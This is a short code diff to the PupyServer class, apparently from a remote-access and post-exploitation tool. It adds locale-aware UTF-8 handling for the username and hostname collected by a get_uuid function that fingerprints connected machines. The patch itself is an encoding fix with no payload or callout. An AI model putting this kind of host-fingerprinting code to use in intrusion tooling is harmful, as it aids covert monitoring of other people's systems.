@@ -63,6 +63,8 @@ class PupyServer(threading.Thread):
 			import uuid
 			import sys
 			import os
+			import locale
+			os_encoding = locale.getpreferredencoding() or "utf8"
 			def get_uuid():
 				user=None
 				node=None
@@ -75,11 +77,11 @@ class PupyServer(threading.Thread):
 				proc_arch=None
 				proc_path=sys.executable
 				try:
-					user=getpass.getuser()
+					user=getpass.getuser().decode(encoding=os_encoding).encode("utf8")
 				except Exception:
 					pass
 				try:
-					node=platform.node()
+					node=platform.node().decode(encoding=os_encoding).encode("utf8")
 				except Exception:
 					pass
 				try:
